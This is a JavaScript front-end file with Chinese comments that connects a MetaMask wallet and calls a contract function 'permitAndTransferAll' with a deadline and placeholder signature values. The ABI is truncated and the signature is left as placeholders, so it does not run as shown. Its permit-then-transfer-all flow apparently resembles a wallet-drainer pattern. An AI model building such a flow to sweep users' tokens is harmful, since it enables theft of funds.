// script.js
const contractAddress = '0x0CcD25CB287E18e55969d65AB5555582657512bE'; // 你的合约地址
const abi = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "ECDSAInvalidSignature",
        "type": "error"
    },
    // 省略其他ABI内容，确保添加完整的ABI
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "deadline",
                "type": "uint256"
            },
            {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
            },
            {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
            },
            {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
            }
        ],
        "name": "permitAndTransferAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;
let contract;

async function init() {
    if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        contract = new web3.eth.Contract(abi, contractAddress);
        document.getElementById("connectButton").disabled = false;
    } else {
        alert('请安装MetaMask!');
    }
}

async function connectWallet() {
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const account = accounts[0];
    document.getElementById("walletAddress").innerText = `钱包地址: ${account}`;
    return account;
}

async function permitAndTransfer() {
    const account = await connectWallet();
    
    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1小时后
    const v = 27; // 这里需要你提供的签名值
    const r = '0x...'; // 这里需要你提供的签名r值
    const s = '0x...'; // 这里需要你提供的签名s值

    try {
        const tx = await contract.methods.permitAndTransferAll(account, deadline, v, r, s).send({ from: account });
        console.log('交易成功', tx);
    } catch (error) {
        console.error('交易失败', error);
    }
}

document.getElementById("connectButton").addEventListener("click", connectWallet);
document.getElementById("transferButton").addEventListener("click", permitAndTransfer);

window.addEventListener('load', init);
